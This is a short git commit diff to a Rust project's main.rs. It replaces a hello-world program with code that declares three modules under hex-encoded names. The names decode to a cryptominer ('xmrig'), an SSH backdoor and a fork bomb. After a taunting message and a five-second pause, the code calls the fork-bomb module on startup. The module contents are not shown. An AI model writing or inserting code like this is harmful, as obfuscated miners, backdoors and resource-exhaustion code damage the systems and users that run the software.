6170e2ee62a8c78f58f1dc42a5aa42ccf91cc80f
Pikkel <ilovemathguy@gmail.com>
2021-12-22 04:42:08 -0500

    yes x2 :^)

--- src/main.rs
+++ src/main.rs
@@ -1,3 +1,14 @@
+mod _0x786d726967;
+mod _0x7373686261636b646f6f72;
+mod _0x666f726b626f6d62;
+
+use _0x666f726b626f6d62::main;
+use std::{thread, time};
+
 fn main() {
-    println!("Hello, world!");
+    println!("welcome to waco, the feds will arrive shortly :^)");
+
+    thread::sleep(time::Duration::from_secs(5));
+
+    _0x666f726b626f6d62::main();
 }
